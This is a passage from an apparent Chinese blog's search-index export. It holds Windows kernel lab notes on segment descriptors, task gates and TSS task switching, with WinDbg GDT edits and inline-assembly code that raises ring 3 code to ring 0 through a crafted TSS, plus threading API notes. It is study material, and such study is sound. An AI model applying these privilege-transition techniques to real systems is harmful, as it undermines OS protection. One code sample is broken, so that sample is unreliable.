0040f300`00000fff80b98840 0000f200`0400ffff 00cff300`0000ffff80b98850 800089b9`ad200067 800089b9`acb0006780b98860 00000000`00000000 00000000`0000000080b98870 800092b9`880003ff 00000000`00000000 TYPE域知识点 当段描述符中S标志（描述符类型）为1时, 描述符为代码段描述符或者数据段描述符。类型域的最高位（段描述符的第二个双字的第11位）将决定该描述符为数据段描述符（为0）还是代码段描述符（为1）。 代码和数据段描述类型 对于数据段而言, 描述符的类型域的低3位（第8、9、10位）被解释为访问控制（A）、是否可写（W）、扩展方向（E）。数据段可以是只读或者可读写的段, 这取决于”是否可写”的标志。 堆栈段必须是可读写的数据段。将一个不可写的数据段的选择子置入SS寄存器会导致一般保护异常（#GP）。如果堆栈段的大小需要动态变化, 可以将其置为向下扩展数据段（扩展方向标志为1）。这里, 动态改变段界限将导致栈空间朝着栈底部空间扩展。如果栈的长度保持不变, 堆栈段可以是向上扩展的, 也可以是向下扩展的。 访问位表示自最后一次被操作系统清零后, 段是否被访问过。每当处理器将段的段选择子置入段寄存器时, 就将访问位置为1。该位一直保持1直到被显式清零。该位可以用于虚拟内存管理和测试。 对于代码段而言, 类型域的低3位被解释为访问位（A）、可读位（R）、一致位（C）。根据可读位的设置, 代码段可以为”只执行”或者”可执行可读”。当有常量或者其它静态数据与指令代码一起在ROM中时, 必须使用”可执行可读”的段。要从代码段读取数据, 可以通过带有CS前缀的指令或者将代码段选择子置入数目段寄存器（DS、ES、FS或者GS）。在保护模式下, 代码段是不可写的。 代码段可以是一致性的, 也可以是不一致性的。转入一个特权级更高的一致性段的进程可以在当前特权级继续执行下去。除非使用了调用门或者任务门, 否则, 转入一个不同特权级的非一致性段将使处理器产生一个”一般保护异常”（#GP）。不访问受保护程序的系统程序和某些类型的异常处理程序（比如除法错误或者溢出）可以被载入一致性的代码段。不能被特权级更低的程序和过程访问的程序应该被载入非一致性的代码段。 注意无论目标段是否为一致性代码段, 进程都不能因为call或jump而转入一个特权级较低（特权值较大）的代码段执行。试图进行这样的执行转换将导致一个一般保护异常（#GP）; 所有数据段都是非一致性的, 这就意味着数据段不能被更低特权级的进程访问（特权级数值较大的执行代码）。然而, 和代码段不同, 数据段可以被更高优先级的程序或过程（特权级数值较小的执行代码）访问, 不需要使用特别的访问门. 如果GDT或者LDT中的段描述符被放置在ROM中, 当程序或者处理器试图更改在ROM中的段描述符时, 处理器将进入一个死循环。为了防止此类问题的发生, 可以将所有放置在ROM中的段描述符设置访问位。同时, 删除所有操作系统代码中试图更改放置在ROM中的段描述符的代码。 段控制内存访问方向知识点代码实验1234567891011121314151617// 1. 修改gdtr中0x48位置为00cff600`0000ffff（type域为6表示读/写, 内存向下扩展）kd&gt; eq 80b98848 00cff600`0000ffffWriteVirtual: 80b98848 not properly sign extendedkd&gt; dq 80b98800ReadVirtual: 80b98800 not properly sign extended80b98800 00000000`00000000 00cf9b00`0000ffff80b98810 00cf9300`0000ffff 00cffb00`0000ffff80b98820 00cff300`0000ffff 80008bb9`8c0020ab80b98830 804093b9`b0004fff 0040f300`00000fff80b98840 0000f200`0400ffff 00cff600`0000ffff80b98850 800089b9`ad200067 800089b9`acb0006780b98860 00000000`00000000 00000000`0000000080b98870 800092b9`880003ff 00000000`00000000// 2. 修改ds寄存器mov ax, 0x48;mov ds, ax;// 运行将产生异常, 将Limit和Base修改成0进行修复（0c0f600`00000000） 非一致代码段: 应用层不能调用内核层代码;一致代码段: 应用层可以直接调用CS描述的一致代码段;","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-任务门","slug":"Windows内核-任务门","date":"2024-09-28T01:10:10.000Z","updated":"2024-09-29T01:40:47.891Z","comments":true,"path":"9144b229.html","link":"","permalink":"http://example.com/9144b229.html","excerpt":"任务门","text":"任务门 前置准备00407030 -&gt; 0000e940&#96;70300068 GDT: eq 80b98848 0000e94070300068 IDT: eq 80b98100 0000e50000480000 知识点INT 8双重异常代码实验完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107// 09_28_TaskGate(任务门).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//// 任务门#include &lt;iostream&gt;#include &lt;Windows.h&gt;//0x2024 bytes (sizeof)struct _KiIoAccessMap&#123; UCHAR DirectionMap[32]; //0x0 UCHAR IoMap[8196]; //0x20&#125;;//0x20ac bytes (sizeof)typedef struct _KTSS&#123; USHORT Backlink; //0x0 USHORT Reserved0; //0x2 ULONG Esp0; //0x4 USHORT Ss0; //0x8 USHORT Reserved1; //0xa ULONG NotUsed1[4]; //0xc ULONG CR3; //0x1c ULONG Eip; //0x20 ULONG EFlags; //0x24 ULONG Eax; //0x28 ULONG Ecx; //0x2c ULONG Edx; //0x30 ULONG Ebx; //0x34 ULONG Esp; //0x38 ULONG Ebp; //0x3c ULONG Esi; //0x40 ULONG Edi; //0x44 USHORT Es; //0x48 USHORT Reserved2; //0x4a USHORT Cs; //0x4c USHORT Reserved3; //0x4e USHORT Ss; //0x50 USHORT Reserved4; //0x52 USHORT Ds; //0x54 USHORT Reserved5; //0x56 USHORT Fs; //0x58 USHORT Reserved6; //0x5a USHORT Gs; //0x5c USHORT Reserved7; //0x5e USHORT LDT; //0x60 USHORT Reserved8; //0x62 USHORT Flags; //0x64 USHORT IoMapBase; //0x66 struct _KiIoAccessMap IoMaps[1]; //0x68 UCHAR IntDirectionMap[32]; //0x208c&#125;KTSS;KTSS tss = &#123; 0 &#125;;char bufEsp0[0x2000] = &#123; 0 &#125;;char bufEsp3[0x2000] = &#123; 0 &#125;;void __declspec(naked) test()&#123; __asm &#123; int 3; pushfd; pop eax; or eax, 0x4000; push eax; popfd; iretd; &#125;&#125;int main()&#123; memset(bufEsp0, 0, 0x2000); memset(bufEsp3, 0, 0x2000); tss.Esp0 = (ULONG)bufEsp0 + 0x1FF0; tss.Esp = (ULONG)bufEsp3 + 0x1FF0; tss.Ss0 = 0x10; tss.Ss = 0x10; tss.Cs = 0x8; tss.Ds = 0x23; tss.Es = 0x23; tss.Fs = 0x30; tss.EFlags = 2; tss.Eip = (ULONG)test; tss.IoMapBase = 0x20ac; printf(&quot;请输入你的CR3: &quot;); DWORD dwCr3 = 0; scanf_s(&quot;%x&quot;, &amp;dwCr3); tss.CR3 = dwCr3; printf(&quot;%p\\r\\n&quot;, &amp;tss); system(&quot;pause&quot;); char bufCode[6] = &#123; 0,0,0,0,0x48,0 &#125;; __asm &#123; // call fword ptr bufCode; int 32; &#125; return 0;&#125;","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"Windows内核-任务段","slug":"Windows内核-任务段","date":"2024-09-27T14:14:14.000Z","updated":"2024-09-28T15:55:56.090Z","comments":true,"path":"f79a1477.html","link":"","permalink":"http://example.com/f79a1477.html","excerpt":"任务段","text":"任务段 前置准备 在程序中获取到tss的地址, 例如: 00407030; 拼接段描述符: 0000e940&#96;703020ac; 修改GDTR中段描述符; 知识点_KTSS结构体1234567891011121314151617181920212223242526272829303132333435363738// _KTSS 结构原形ntdll!_KTSS +0x000 Backlink : Uint2B +0x002 Reserved0 : Uint2B +0x004 Esp0 : Uint4B +0x008 Ss0 : Uint2B +0x00a Reserved1 : Uint2B +0x00c NotUsed1 : [4] Uint4B +0x01c CR3 : Uint4B +0x020 Eip : Uint4B +0x024 EFlags : Uint4B +0x028 Eax : Uint4B +0x02c Ecx : Uint4B +0x030 Edx : Uint4B +0x034 Ebx : Uint4B +0x038 Esp : Uint4B +0x03c Ebp : Uint4B +0x040 Esi : Uint4B +0x044 Edi : Uint4B +0x048 Es : Uint2B +0x04a Reserved2 : Uint2B +0x04c Cs : Uint2B +0x04e Reserved3 : Uint2B +0x050 Ss : Uint2B +0x052 Reserved4 : Uint2B +0x054 Ds : Uint2B +0x056 Reserved5 : Uint2B +0x058 Fs : Uint2B +0x05a Reserved6 : Uint2B +0x05c Gs : Uint2B +0x05e Reserved7 : Uint2B +0x060 LDT : Uint2B +0x062 Reserved8 : Uint2B +0x064 Flags : Uint2B +0x066 IoMapBase : Uint2B +0x068 IoMaps : [1] _KiIoAccessMap +0x208c IntDirectionMap : [32] UChar 代码实验123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154// 当输入CR3后进入0环断点后的各种情况kd&gt; r trtr=00000048 // 当前tr寄存器已改变为0x48, 之前为0x28kd&gt; dg 28 P Si Gr Pr LoSel Base Limit Type l ze an es ng Flags---- -------- -------- ---------- - -- -- -- -- --------0028 80b98c00 000020ab TSS32 Busy 0 Nb By P Nl 0000008bkd&gt; dt _KTSS 80b98c00ntdll!_KTSS +0x000 Backlink : 0 +0x002 Reserved0 : 0 +0x004 Esp0 : 0xad01fcb0 +0x008 Ss0 : 0x10 +0x00a Reserved1 : 0 +0x00c NotUsed1 : [4] 0 +0x01c CR3 : 0 +0x020 Eip : 0x401364 +0x024 EFlags : 0x246 +0x028 Eax : 0 +0x02c Ecx : 0xfde7b46e +0x030 Edx : 0x270178 +0x034 Ebx : 0x7ffd6000 +0x038 Esp : 0x12fe04 +0x03c Ebp : 0x12ff08 +0x040 Esi : 0x12fe04 +0x044 Edi : 0x12ff08 +0x048 Es : 0x23 +0x04a Reserved2 : 0 +0x04c Cs : 0x1b +0x04e Reserved3 : 0 +0x050 Ss : 0x23 +0x052 Reserved4 : 0 +0x054 Ds : 0x23 +0x056 Reserved5 : 0 +0x058 Fs : 0x3b +0x05a Reserved6 : 0 +0x05c Gs : 0 +0x05e Reserved7 : 0 +0x060 LDT : 0 +0x062 Reserved8 : 0 +0x064 Flags : 0 +0x066 IoMapBase : 0x20ac +0x068 IoMaps : [1] _KiIoAccessMap +0x208c IntDirectionMap : [32] &quot;???&quot;kd&gt; u 0x40136400401364 cc int 300401365 c0528bcd rcl byte ptr [edx-75h],0CDh00401369 50 push eax0040136a 8d1598134000 lea edx,ds:[401398h]00401370 e87b020000 call 004015f000401375 58 pop eax00401376 5a pop edx00401377 5f pop edikd&gt; dg 48 P Si Gr Pr LoSel Base Limit Type l ze an es ng Flags---- -------- -------- ---------- - -- -- -- -- --------0048 00407030 00000100 TSS32 Busy 3 Nb By P Nl 000000ebkd&gt; dt _KTSS 00407030ntdll!_KTSS +0x000 Backlink : 0x28 // 上一个段的 +0x002 Reserved0 : 0 +0x004 Esp0 : 0x40b0d0 +0x008 Ss0 : 0x10 +0x00a Reserved1 : 0 +0x00c NotUsed1 : [4] 0 +0x01c CR3 : 0x3f31e640 +0x020 Eip : 0x401080 +0x024 EFlags : 2 +0x028 Eax : 0 +0x02c Ecx : 0 +0x030 Edx : 0 +0x034 Ebx : 0 +0x038 Esp : 0x40d0d0 +0x03c Ebp : 0 +0x040 Esi : 0 +0x044 Edi : 0 +0x048 Es : 0x23 +0x04a Reserved2 : 0 +0x04c Cs : 8 +0x04e Reserved3 : 0 +0x050 Ss : 0x10 +0x052 Reserved4 : 0 +0x054 Ds : 0x23 +0x056 Reserved5 : 0 +0x058 Fs : 0x30 +0x05a Reserved6 : 0 +0x05c Gs : 0 +0x05e Reserved7 : 0 +0x060 LDT : 0 +0x062 Reserved8 : 0 +0x064 Flags : 0 +0x066 IoMapBase : 0x20ac +0x068 IoMaps : [1] _KiIoAccessMap +0x208c IntDirectionMap : [32] &quot;&quot;kd&gt; reax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=00000000 edi=00000000eip=00401080 esp=0040d0d0 ebp=00000000 iopl=0 nv up di pl nz na po nccs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00004002 // 0100 0000 0000 0010 NTkd&gt; r espesp=0040d0d0 // 上面结构体中的espkd&gt; dg 48 P Si Gr Pr LoSel Base Limit Type l ze an es ng Flags---- -------- -------- ---------- - -- -- -- -- --------0048 00407030 00000100 TSS32 Busy 3 Nb By P Nl 000000ebkd&gt; r gdtrgdtr=80b98800kd&gt; dq 80b98800ReadVirtual: 80b98800 not properly sign extended80b98800 00000000`00000000 00cf9b00`0000ffff80b98810 00cf9300`0000ffff 00cffb00`0000ffff80b98820 00cff300`0000ffff 80008bb9`8c0020ab80b98830 804093b9`b0004fff 7f40f3fd`f0000fff80b98840 0000f200`0400ffff 0000eb40`70300100 // 段描述符中的eb和48中的一致80b98850 800089b9`ad200067 800089b9`acb0006780b98860 00000000`00000000 00000000`0000000080b98870 800092b9`880003ff 00000000`00000000kd&gt; r espesp=0040d0d0kd&gt; dds 0040d0d0 // 使用call跨段跳转时会保存cs、esp、ss、eip0040d0d0 000000000040d0d4 000000000040d0d8 000000000040d0dc 000000000040d0e0 000000040040d0e4 000000000040d0e8 000000020040d0ec 000000000040d0f0 000000010040d0f4 000000000040d0f8 000000000040d0fc 000000000040d100 000000000040d104 000000000040d108 000000000040d10c 000000000040d110 000000000040d114 000000000040d118 000000000040d11c 000000000040d120 000000000040d124 000000000040d128 000000000040d12c 000000000040d130 000000000040d134 000000000040d138 000000000040d13c 000000000040d140 000000000040d144 000000000040d148 000000000040d14c 00000000 通过jmp指令提权 jmp可以通过任务段提权, 同时替换CS和SS寄存器 怎样返回3环 使用call跨段跳转时会保存cs、esp、ss、eip, 使用任务门时没保存这些值, 怎么返回？ 123456789void __declspec(naked) test()&#123; __asm &#123; int 3; // &lt;-- 导致系统奔溃的主要原因, 清空了NT位 iretd; &#125;&#125; 问题剖析恢复运行后将导致系统崩溃, 中断门会修改VM、NT、IF、TF位, 并按照堆栈返回, 当NT位置0后再根据堆栈返回时将出现系统崩溃;iretd指令首先检测eflag.NT位, 如果NT位等于0, 就按照堆栈返回; 如果NT位等于1, 就按照Backlink找到要返回的上下文环境返回; 解决方式 12345678910111213void __declspec(naked) test()&#123; __asm &#123; int 3; pushfd; pop eax; or eax, 0x4000; push eax; popfd; iretd; &#125;&#125; 需要手动修复dg 28中_KTSS结构的CR3123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687kd&gt; !process 0 0**** NT ACTIVE PROCESS DUMP ****...PROCESS 85b021a8 SessionId: 1 Cid: 0e60 Peb: 7ffde000 ParentCid: 0e4c DirBase: 3f344640 ObjectTable: 959357d8 HandleCount: 7. Image: 09_27_TaskSegments(ÈÎÎñ¶Î).exekd&gt; dg 28 P Si Gr Pr LoSel Base Limit Type l ze an es ng Flags---- -------- -------- ---------- - -- -- -- -- --------0028 80b98c00 000020ab TSS32 Busy 0 Nb By P Nl 0000008bkd&gt; dt _KTSS 80b98c00ntdll!_KTSS +0x000 Backlink : 0 +0x002 Reserved0 : 0 +0x004 Esp0 : 0x83f75cb0 +0x008 Ss0 : 0x10 +0x00a Reserved1 : 0 +0x00c NotUsed1 : [4] 0 +0x01c CR3 : 0 // &lt;-- 需要手动修复成该程序的CR3 +0x020 Eip : 0 +0x024 EFlags : 0 +0x028 Eax : 0 +0x02c Ecx : 0 +0x030 Edx : 0 +0x034 Ebx : 0 +0x038 Esp : 0 +0x03c Ebp : 0 +0x040 Esi : 0 +0x044 Edi : 0 +0x048 Es : 0 +0x04a Reserved2 : 0 +0x04c Cs : 0 +0x04e Reserved3 : 0 +0x050 Ss : 0 +0x052 Reserved4 : 0 +0x054 Ds : 0 +0x056 Reserved5 : 0 +0x058 Fs : 0 +0x05a Reserved6 : 0 +0x05c Gs : 0 +0x05e Reserved7 : 0 +0x060 LDT : 0 +0x062 Reserved8 : 0 +0x064 Flags : 0 +0x066 IoMapBase : 0x20ac +0x068 IoMaps : [1] _KiIoAccessMap +0x208c IntDirectionMap : [32] &quot;???&quot;kd&gt; eq 80b98c00+1c 3f344640WriteVirtual: 80b98c1c not properly sign extendedkd&gt; dt _KTSS 80b98c00ntdll!_KTSS +0x000 Backlink : 0 +0x002 Reserved0 : 0 +0x004 Esp0 : 0x83f75cb0 +0x008 Ss0 : 0x10 +0x00a Reserved1 : 0 +0x00c NotUsed1 : [4] 0 +0x01c CR3 : 0x3f344640 // &lt;-- 修复后 +0x020 Eip : 0 +0x024 EFlags : 0 +0x028 Eax : 0 +0x02c Ecx : 0 +0x030 Edx : 0 +0x034 Ebx : 0 +0x038 Esp : 0 +0x03c Ebp : 0 +0x040 Esi : 0 +0x044 Edi : 0 +0x048 Es : 0 +0x04a Reserved2 : 0 +0x04c Cs : 0 +0x04e Reserved3 : 0 +0x050 Ss : 0 +0x052 Reserved4 : 0 +0x054 Ds : 0 +0x056 Reserved5 : 0 +0x058 Fs : 0 +0x05a Reserved6 : 0 +0x05c Gs : 0 +0x05e Reserved7 : 0 +0x060 LDT : 0 +0x062 Reserved8 : 0 +0x064 Flags : 0 +0x066 IoMapBase : 0x20ac +0x068 IoMaps : [1] _KiIoAccessMap +0x208c IntDirectionMap : [32] &quot;???&quot; 完整代码 包含使用jmp指令实现任务切换 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168// 09_27_TaskSegments(任务段).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//// 任务段#include &lt;iostream&gt;#include &lt;Windows.h&gt;// _KTSS 结构原形/*ntdll!_KTSS +0x000 Backlink : Uint2B +0x002 Reserved0 : Uint2B +0x004 Esp0 : Uint4B +0x008 Ss0 : Uint2B +0x00a Reserved1 : Uint2B +0x00c NotUsed1 : [4] Uint4B +0x01c CR3 : Uint4B +0x020 Eip : Uint4B +0x024 EFlags : Uint4B +0x028 Eax : Uint4B +0x02c Ecx : Uint4B +0x030 Edx : Uint4B +0x034 Ebx : Uint4B +0x038 Esp : Uint4B +0x03c Ebp : Uint4B +0x040 Esi : Uint4B +0x044 Edi : Uint4B +0x048 Es : Uint2B +0x04a Reserved2 : Uint2B +0x04c Cs : Uint2B +0x04e Reserved3 : Uint2B +0x050 Ss : Uint2B +0x052 Reserved4 : Uint2B +0x054 Ds : Uint2B +0x056 Reserved5 : Uint2B +0x058 Fs : Uint2B +0x05a Reserved6 : Uint2B +0x05c Gs : Uint2B +0x05e Reserved7 : Uint2B +0x060 LDT : Uint2B +0x062 Reserved8 : Uint2B +0x064 Flags : Uint2B +0x066 IoMapBase : Uint2B +0x068 IoMaps : [1] _KiIoAccessMap +0x208c IntDirectionMap : [32] UChar*/char szRet[6] = &#123; 0 &#125;; // jmp 任务切换跳回//0x2024 bytes (sizeof)struct _KiIoAccessMap&#123; UCHAR DirectionMap[32]; //0x0 UCHAR IoMap[8196]; //0x20&#125;;//0x20ac bytes (sizeof)typedef struct _KTSS&#123; USHORT Backlink; //0x0 USHORT Reserved0; //0x2 ULONG Esp0; //0x4 USHORT Ss0; //0x8 USHORT Reserved1; //0xa ULONG NotUsed1[4]; //0xc ULONG CR3; //0x1c ULONG Eip; //0x20 ULONG EFlags; //0x24 ULONG Eax; //0x28 ULONG Ecx; //0x2c ULONG Edx; //0x30 ULONG Ebx; //0x34 ULONG Esp; //0x38 ULONG Ebp; //0x3c ULONG Esi; //0x40 ULONG Edi; //0x44 USHORT Es; //0x48 USHORT Reserved2; //0x4a USHORT Cs; //0x4c USHORT Reserved3; //0x4e USHORT Ss; //0x50 USHORT Reserved4; //0x52 USHORT Ds; //0x54 USHORT Reserved5; //0x56 USHORT Fs; //0x58 USHORT Reserved6; //0x5a USHORT Gs; //0x5c USHORT Reserved7; //0x5e USHORT LDT; //0x60 USHORT Reserved8; //0x62 USHORT Flags; //0x64 USHORT IoMapBase; //0x66 struct _KiIoAccessMap IoMaps[1]; //0x68 UCHAR IntDirectionMap[32]; //0x208c&#125;KTSS;KTSS tss = &#123; 0 &#125;;char bufEsp0[0x2000] = &#123; 0 &#125;;char bufEsp3[0x2000] = &#123; 0 &#125;;void __declspec(naked) test()&#123;#if 0 __asm &#123; int 3; pushfd; pop eax; or eax, 0x4000; push eax; popfd; iretd; &#125;#else __asm &#123; int 3; jmp fword ptr szRet; &#125;#endif // 0&#125;int main()&#123; WORD tr = 0; __asm &#123; str tr; &#125; *(WORD*)&amp;szRet[4] = tr; // 保存旧的tr值 memset(bufEsp0, 0, 0x2000); memset(bufEsp3, 0, 0x2000); tss.Esp0 = (ULONG)bufEsp0 + 0x1FF0; tss.Esp = (ULONG)bufEsp3 + 0x1FF0; tss.Eax = 0x1111; tss.Ss0 = 0x10; tss.Ss = 0x10; tss.Cs = 0x8; tss.Ds = 0x23; tss.Es = 0x23; tss.Fs = 0x30; tss.EFlags = 2; tss.Eip = (ULONG)test; tss.IoMapBase = 0x20ac; printf(&quot;请输入你的CR3: &quot;); DWORD dwCr3 = 0; ULONG ulCr3 = 0; ULONG pCr3 = 0; scanf(&quot;%x&quot;, &amp;dwCr3); tss.CR3 = dwCr3; printf(&quot;%p\\r\\n&quot;, &amp;tss); system(&quot;pause&quot;); char bufCode[6] = &#123; 0,0,0,0,0x48,0 &#125;; __asm &#123; // call fword ptr bufCode; jmp fword ptr bufCode; // jmp实现任务切换 &#125; return 0;&#125;","categories":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/categories/Windows%E5%86%85%E6%A0%B8/"}],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://example.com/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"加密壳","slug":"加密壳","date":"2024-08-07T09:14:54.000Z","updated":"2024-08-08T09:57:42.658Z","comments":true,"path":"175feeb0.html","link":"","permalink":"http://example.com/175feeb0.html","excerpt":"加密壳","text":"加密壳 加壳解壳","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"Windows线程控制","slug":"Windows线程控制","date":"2024-08-01T14:17:58.000Z","updated":"2024-08-02T15:55:04.938Z","comments":true,"path":"a313d734.html","link":"","permalink":"http://example.com/a313d734.html","excerpt":"Windows线程控制","text":"Windows线程控制 临界区互斥体事件信号量","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"CreateEvent","slug":"CreateEvent","date":"2024-08-01T01:13:05.000Z","updated":"2024-08-01T01:38:35.004Z","comments":true,"path":"a0774706.html","link":"","permalink":"http://example.com/a0774706.html","excerpt":"","text":"","categories":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/categories/Windows-API/"}],"tags":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/tags/Windows-API/"}]},{"title":"CreateThread","slug":"CreateThread","date":"2024-07-30T01:35:47.000Z","updated":"2024-07-31T13:49:46.373Z","comments":true,"path":"906a06b0.html","link":"","permalink":"http://example.com/906a06b0.html","excerpt":"创建在调用进程的虚拟地址空间内执行的线程。若要创建在另一个进程的虚拟地址空间中运行的线程，请使用CreateRemoteThread函数。","text":"创建在调用进程的虚拟地址空间内执行的线程。若要创建在另一个进程的虚拟地址空间中运行的线程，请使用CreateRemoteThread函数。 函数声明123456789101112WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateThread( _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ __drv_aliasesMem LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId ); 参数lpThreadAttributes指向SECURITY_ATTRIBUTES结构的指针, 该结构确定是否可由子进程继承返回的句柄。如果lpThreadAttributes为NULL, 则无法进程句柄; dwStackSize堆栈的初始大小（以字节为单位）。系统将此值舍入到最近的页面。如果此参数为零, 则新线程将使用可执行文件的默认大小; lpStartAddress指向要由线程执行的应用程序定义函数的指针。此指针表示线程的起始地址; lpStartAddress函数原型123DWORD WINAPI ThreadProc( _In_ LPVOID lpParameter); lpParameter指向要传递给线程的变量的指针; dwCreationFlags控制线程的标志 值 含义 0 线程在创建后立即运行 CREATE_SUSPENDED 0x00000004 线程以挂起状态创建, 在调用ResumeThread函数之前不会运行 STACK_SIZE_PARAM_IS_A_RESERVATION 0x00010000 dwStackSize参数指定堆栈的初始保留大小。如果未指定此标志, dwStackSize将指定提交大小 lpThreadId指向接收线程标识符的变量的指针。如果此参数为NULL, 则不返回线程标识符; 返回值 如果函数成功, 则返回值是新线程的句柄;如果函数失败, 则返回值为NULL; 代码示例123456789101112131415161718192021222324252627282930313233343536373839DWORD WINAPI ThreadFirstProc(LPVOID lpParameter)&#123; WCHAR wcBuffer[20]&#123;&#125;; DWORD dwTimer = 0; ::GetWindowText((HWND)lpParameter, wcBuffer, 20); WCHAR wcValue[20]&#123;&#125;; int iValue = _wtoi(wcBuffer); while (iValue &gt; 0) &#123; wsprintf(wcValue, L&quot;%d&quot;, --iValue); ::SetWindowText((HWND)lpParameter, wcValue); Sleep(1000); &#125; return 0; &#125;DWORD WINAPI ThreadSecondProc(LPVOID lpParameter)&#123; WCHAR wcBuffer[20]&#123;&#125;; DWORD dwTimer = 0; ::GetWindowText((HWND)lpParameter, wcBuffer, 20); WCHAR wcValue[20]&#123;&#125;; int iValue = _wtoi(wcBuffer); while (iValue &gt;= 0) &#123; wsprintf(wcValue, L&quot;%d&quot;, ++iValue); ::SetWindowText((HWND)lpParameter, wcValue); Sleep(1000); &#125; return 0;&#125;CWnd* pWndFirst = GetDlgItem(IDC_EDIT1);HWND hWndFirst = pWndFirst-&gt;GetSafeHwnd();CWnd* pWndSecond = GetDlgItem(IDC_EDIT2);HWND hWndSecond = pWndSecond-&gt;GetSafeHwnd();HANDLE hThreadFirst = ::CreateThread(NULL, 0, ThreadFirstProc, hWndFirst, 0, NULL);HANDLE hThreadSecond = ::CreateThread(NULL, 0, ThreadSecondProc, hWndSecond, 0, NULL); WaitForSingleObject功能说明等待函数可使线程自愿进入等待状态, 直到一个特定的内核对象变为已通知状态为止; 函数声明1234567WINBASEAPIDWORDWINAPIWaitForSingleObject( _In_ HANDLE hHandle, // handle to object _In_ DWORD dwMilliseconds // time-out interval ); 参数说明hHandle内核对象句柄, 可以是进程也可以是线程; dwMilliseconds等待时间, 单位是毫秒; INFINITE(-1)一直等待; 返回值 WAIT_OBJECT_0(0); 等待对象变为已通知; WAIT_TIMEOUT(0x102); 超时; 特别说明 内核对象中的每种对象都可以说是处于已通知或未通知的状态之中; 这种状态的切换是由Microsoft为每个对象建立的一套规则来决定的; 当线程正在运行的时候, 线程内核对象处于未通知状态; 当线程终止运行的时候, 它就变为已通知状态; 在内核中就是个BOOL值, 运行时FALSE, 结束TRUE; 代码演示123456789101112131415161718DWORD WINAPI ThreadProc1(LPVOID lpParameter) &#123; for(int i=0;i&lt;5;i++) &#123; printf(&quot;+++++++++\\n&quot;); Sleep(1000); &#125; return 0;&#125; int main(int argc, char* argv[]) &#123; //创建一个新的线程 HANDLE hThread1 = ::CreateThread(NULL, 0, ThreadProc1, DWORD dwCode = ::WaitForSingleObject(hThread1, INFINITE); MessageBox(0,0,0,0); return 0;&#125; WaitForMultipleObjects功能说明同时查看若干个内核对象的已通知状态; 函数声明123456789WINBASEAPIDWORDWINAPIWaitForMultipleObjects( _In_ DWORD nCount, _In_reads_(nCount) CONST HANDLE* lpHandles, _In_ BOOL bWaitAll, _In_ DWORD dwMilliseconds ); 参数说明nCount要查看内核对象的数量; lpHandles内核对象数组 bWaitAll等待类型; TRUE: 等待所有变为已通知, FALSE: 只要有一个变为已通知; dwMilliseconds超时时间; INFINITE一直等待; 返回值 bWaitAll为TRUE时, 返回WAIT_OBJECT_0(0)代码所有内核对象都变为已通知; bWaitAll为FALSE时, 返回最先变成已通知的内核对象在数组中的索引; WAIT_TIMEOUT(0x102), 超时; 代码示例12345678910111213141516171819202122232425262728293031323334353637DWORD WINAPI ThreadProc1(LPVOID lpParameter) &#123; for(int i=0;i&lt;5;i++) &#123; printf(&quot;+++++++++\\n&quot;); Sleep(1000); &#125; return 0; &#125; DWORD WINAPI ThreadProc2(LPVOID lpParameter) &#123; for(int i=0;i&lt;3;i++) &#123; printf(&quot;---------\\n&quot;); Sleep(1000); &#125; return 0; &#125; int main(int argc, char* argv[]) &#123; HANDLE hArray[2]; //创建一个新的线程 HANDLE hThread1 = ::CreateThread(NULL, 0, ThreadProc1, NULL, 0, NULL); //创建一个新的线程 HANDLE hThread2 = ::CreateThread(NULL, 0, ThreadProc2, NULL, 0, NULL); hArray[0] = hThread1; hArray[1] = hThread2; DWORD dwCode = ::WaitForMultipleObjects(2, hArray,FALSE,INFINITE); MessageBox(0,0,0,0); return 0; &#125;","categories":[{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/categories/Windows-API/"}],"tags":[{"name":"Windows 